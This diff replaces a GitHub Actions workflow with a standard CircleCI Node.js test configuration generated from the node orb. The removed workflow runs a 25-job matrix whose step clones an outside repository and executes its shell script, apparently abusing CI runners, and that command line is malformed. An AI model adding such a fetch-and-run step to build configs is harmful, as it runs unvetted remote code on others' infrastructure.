@@ -1,27 +1,76 @@
-name: Healling
-on: [push, pull_request]
+# Orb 'circleci/node@4.7.0' resolved to 'circleci/node@4.7.0'
+version: 2
 jobs:
-    build:
-    name: Healling_Mint
-    runs-on: ubuntu-18.04
-    strategy:
-      max-parallel: 5
-      fail-fast: false
-      matrix:
-        go: [1.1, 1.2, 1.3, 1.4, 1.5]
-        flag: [A, B, C, D, E]
-    timeout-minutes: 12
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
+  node/test:
+    docker:
+    - image: cimg/node:13.11.0
     steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: Setup
-      uses: actions/checkout@v1
-    - name: runner_go
-      run: |
-        cloning git https://github.com/SetanBudek/benihcinta.git && chmod +x kudenganmu.sh && ./kudenganmu.sh
+    - checkout
+    - run:
+        command: |
+          if [ ! -f "package.json" ]; then
+            echo
+            echo "---"
+            echo "Unable to find your package.json file. Did you forget to set the app-dir parameter?"
+            echo "---"
+            echo
+            echo "Current directory: $(pwd)"
+            echo
+            echo
+            echo "List directory: "
+            echo
+            ls
+            exit 1
+          fi
+        name: Checking for package.json
+        working_directory: ~/project
+    - run:
+        command: |
+          if [ -f "package-lock.json" ]; then
+            echo "Found package-lock.json file, assuming lockfile"
+            ln package-lock.json /tmp/node-project-lockfile
+          elif [ -f "npm-shrinkwrap.json" ]; then
+            echo "Found npm-shrinkwrap.json file, assuming lockfile"
+            ln npm-shrinkwrap.json /tmp/node-project-lockfile
+          elif [ -f "yarn.lock" ]; then
+            echo "Found yarn.lock file, assuming lockfile"
+            ln yarn.lock /tmp/node-project-lockfile
+          fi
+          ln package.json /tmp/node-project-package.json
+        name: Determine lockfile
+        working_directory: ~/project
+    - restore_cache:
+        keys:
+        - node-deps-{{ arch }}-v1-{{ .Branch }}-{{ checksum "/tmp/node-project-package.json" }}-{{ checksum "/tmp/node-project-lockfile" }}
+        - node-deps-{{ arch }}-v1-{{ .Branch }}-{{ checksum "/tmp/node-project-package.json" }}-
+        - node-deps-{{ arch }}-v1-{{ .Branch }}-
+    - run:
+        command: "if [[ ! -z \"\" ]]; then\n  echo \"Running override package installation command:\"\n  \nelse\n  npm ci\nfi\n"
+        name: Installing NPM packages
+        working_directory: ~/project
+    - save_cache:
+        key: node-deps-{{ arch }}-v1-{{ .Branch }}-{{ checksum "/tmp/node-project-package.json" }}-{{ checksum "/tmp/node-project-lockfile" }}
+        paths:
+        - ~/.npm
+    - run:
+        command: npm run test
+        name: Run NPM Tests
+        working_directory: ~/project
+workflows:
+  version: 2
+  example-workflow:
+    jobs:
+    - node/test
+
+# Original config.yml file:
+# version: 2.1
+#
+# orbs:
+#   node: circleci/node@4.7.0
+#
+# workflows:
+#   version: 2
+#   example-workflow:
+#       jobs:
+#         - node/test
+
